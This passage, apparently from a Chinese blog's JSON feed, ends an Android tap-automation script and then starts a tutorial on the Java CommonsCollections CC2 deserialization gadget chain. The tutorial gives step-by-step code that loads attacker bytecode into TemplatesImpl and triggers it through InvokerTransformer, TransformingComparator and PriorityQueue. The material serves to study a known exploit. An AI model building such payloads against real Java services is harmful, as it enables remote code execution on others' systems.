class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"298\"></td><td><pre>                task_process <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"299\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"300\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"301\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"302\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"303\"></td><td><pre></pre></td></tr><tr><td data-num=\"304\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"305\"></td><td><pre> * 点击控件中点</pre></td></tr><tr><td data-num=\"306\"></td><td><pre> * </pre></td></tr><tr><td data-num=\"307\"></td><td><pre> * @param &#123;*&#125; uiName </pre></td></tr><tr><td data-num=\"308\"></td><td><pre> * @param &#123;*&#125; type </pre></td></tr><tr><td data-num=\"309\"></td><td><pre> * @param &#123;*&#125; index </pre></td></tr><tr><td data-num=\"310\"></td><td><pre> * @returns </pre></td></tr><tr><td data-num=\"311\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"312\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">clickCenter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">uiName<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">,</span> index</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"313\"></td><td><pre>    <span class=\"token keyword\">let</span> type <span class=\"token operator\">=</span> type <span class=\"token operator\">||</span> <span class=\"token string\">'text'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"314\"></td><td><pre>    <span class=\"token keyword\">let</span> index <span class=\"token operator\">=</span> index <span class=\"token operator\">||</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"315\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"316\"></td><td><pre>        <span class=\"token keyword\">const</span> bounds <span class=\"token operator\">=</span> type <span class=\"token operator\">==</span> <span class=\"token string\">\"desc\"</span> <span class=\"token operator\">?</span> <span class=\"token function\">desc</span><span class=\"token punctuation\">(</span>uiName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">bounds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">text</span><span class=\"token punctuation\">(</span>uiName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">bounds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"317\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"318\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"319\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"320\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"点击坐标：\"</span><span class=\"token punctuation\">,</span> bounds<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> bounds<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"321\"></td><td><pre>    <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"322\"></td><td><pre>    <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"323\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">click</span><span class=\"token punctuation\">(</span>bounds<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> bounds<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"324\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"325\"></td><td><pre></pre></td></tr><tr><td data-num=\"326\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"327\"></td><td><pre> * 根据坐标直接点击</pre></td></tr><tr><td data-num=\"328\"></td><td><pre> * @param &#123;*&#125; bounds </pre></td></tr><tr><td data-num=\"329\"></td><td><pre> * @returns </pre></td></tr><tr><td data-num=\"330\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"331\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x1<span class=\"token punctuation\">,</span> y1<span class=\"token punctuation\">,</span> x2<span class=\"token punctuation\">,</span> y2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"332\"></td><td><pre>    <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"333\"></td><td><pre>    <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"334\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">click</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x1 <span class=\"token operator\">+</span> x2<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>y1 <span class=\"token operator\">+</span> y2<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"335\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"336\"></td><td><pre></pre></td></tr><tr><td data-num=\"337\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"338\"></td><td><pre> * 自动判断程序是否卡顿，恢复方法</pre></td></tr><tr><td data-num=\"339\"></td><td><pre> * 判断依据：1. 不在活动界面 2. 停留某个界面长达 15s</pre></td></tr><tr><td data-num=\"340\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"341\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">recoverApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"342\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">></span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"343\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"344\"></td><td><pre>            <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"345\"></td><td><pre>            task_process <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"346\"></td><td><pre>            <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"347\"></td><td><pre>            <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"348\"></td><td><pre>            app<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>appPackageName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"349\"></td><td><pre>            <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"停留某个页面超过15s,自动返回，重置定时器。\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"350\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"351\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"352\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"353\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>你也可以使用 hamibot 这样的平台，里面包含了众多脚本，<span class=\"exturl\" data-url=\"aHR0czovL3d3dy5iYWlkdS5jb20=\">hamibot 的使用</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYW1pYm90LmNvbS9yZWZlcnJhbHMvZXBtaA==\">立即注册 hamibot</span></p>\n<h2 id=\"ios用户使用快捷指令\"><a class=\"anchor\" href=\"#ios用户使用快捷指令\">#</a> ios 用户：使用快捷指令</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmN1dHMuY29tLw==\">快捷指令库</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGFyZWN1dHMuY24v\">捷径社区</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmN1dHMuY29tLw==\">捷径库</span><br />\n你可以在上方按钮获取更多的 ios 快捷指令，目前暂未提供双十一相关的指令</p>\n",
            "tags": [
                "自动化",
                "小工具"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/23/%E5%85%B6%E4%BB%96CC/",
            "url": "http://zhyzhyzhy.cn/2022/10/23/%E5%85%B6%E4%BB%96CC/",
            "title": "Java反序列化CommonsCollections篇(完结)",
            "date_published": "2022-10-22T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>前几篇讲解了 CC 链的几个典型的利用方式，本篇说一下 CC 其余几个利用链，其实就是上次说到的拼接组合。</p>\n</blockquote>\n<h1 id=\"cc2\"><a class=\"anchor\" href=\"#cc2\">#</a> CC2</h1>\n<p>针对<br />\n<em><strong> org.apache.commons:commons-collections4:4.0</strong></em></p>\n<blockquote>\n<p>先看一下 ysoserial 的 Gadget chain</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tGadget chain:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\tObjectInputStream.readObject()</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\tPriorityQueue.readObject()</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t\t...</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t\t\tTransformingComparator.compare()</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\t\t\t\tInvokerTransformer.transform()</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t\t\t\t\tMethod.invoke()</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t\t\t\t\t\tRuntime.exec()</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> */</span></pre></td></tr></table></figure><p>后半条还是挺熟悉的，我们还是接着使用 CC3 的后半条链</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span> templates <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> templates<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 Class</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// 对_name 进行复制</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">Field</span> name <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token string\">\"aa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 对_bytecodes 进行赋值</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span> <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">readAllBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Paths</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Class路径\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Field</span> bytecodes <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// 对 _tfactory 进行赋值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">Field</span> tfactory <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>我们知道，现在只要调用到 templates 的 newTransformer 方法就能执行我们的字节码，ysoserial 的 Gadget chain 中使用了 InvokerTransformer.transform () 进行反射调用</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">InvokerTransformer</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> objectObjectInvokerTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newTransformer\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        objectObjectInvokerTransformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>只要在 <code>transfrom</code>  中填入我们 <code>templates</code>  就能代码执行，跟着 ysoserial 中的 Gadget chain 接着走，它使用了 <code>TransformingComparator.compare()</code></p>\n<blockquote>\n<p>TransformingComparator</p>\n</blockquote>\n<p>构造函数，传入一个  <code>transformer</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">TransformingComparator</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">Transformer</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">super</span> <span class=\"token class-name\">I</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">O</span><span class=\"token punctuation\">></span></span> transformer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">(</span>transformer<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ComparatorUtils</span><span class=\"token punctuation\">.</span><span class=\"token constant\">NATURAL_COMPARATOR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>``compare <code>方法调用了</code>  transformer <code>的</code>  transform`</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">compare</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">I</span> obj1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">I</span> obj2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">final</span> <span class=\"token class-name\">O</span> value1 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>transformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">final</span> <span class=\"token class-name\">O</span> value2 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>transformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>decorated<span class=\"token punctuation\">.</span><span class=\"token function\">compare</span><span class=\"token punctuation\">(</span>value1<span class=\"token punctuation\">,</span> value2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>将参数拼接</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TransformingComparator</span> transformingComparator <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformingComparator</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>objectObjectInvokerTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>transformingComparator<span class=\"token punctuation\">.</span><span class=\"token function\">compare</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>compare</code>  是  <code>public</code>  方法，就是说可以直接找谁的 <code>readObject</code>  中调用到了  <code>compare</code>  方法</p>\n<blockquote>\n<p>PriorityQueue</p>\n</blockquote>\n<p><code>PriorityQueue</code>  的 <code>readObject</code>  中就调用到了 <code>compare</code>  方法</p>\n<p>构造方法 传入一个  <code>comparator</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">PriorityQueue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Comparator</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">super</span> <span class=\"token class-name\">E</span><span class=\"token punctuation\">></span></span> comparator<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DEFAULT_INITIAL_CAPACITY</span><span class=\"token punctuation\">,</span> comparator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p><code>readObject</code>  中调用到了 <code>heapify</code>  方法</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">heapify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size <span class=\"token operator\">>>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token function\">siftDown</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> queue<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>走到  <code>siftDown</code></p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">siftDown</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k<span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>comparator <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token function\">siftDownUsingComparator</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token function\">siftDownComparable</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>走到  <code>siftDownUsingComparator</code> ，调用到  <code>comparator.compare</code></p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">siftDownUsingComparator</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k<span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">int</span> half <span class=\"token operator\">=</span> size <span class=\"token operator\">>>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">&lt;</span> half<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">int</span> child <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token class-name\">Object</span> c <span class=\"token operator\">=</span> queue<span class=\"token punctuation\">[</span>child<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">int</span> right <span class=\"token operator\">=</span> child <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">&lt;</span> size <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                comparator<span class=\"token punctuation\">.</span><span class=\"token function\">compare</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> c<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> queue<span class=\"token punctuation\">[</span>right<span class=\"token 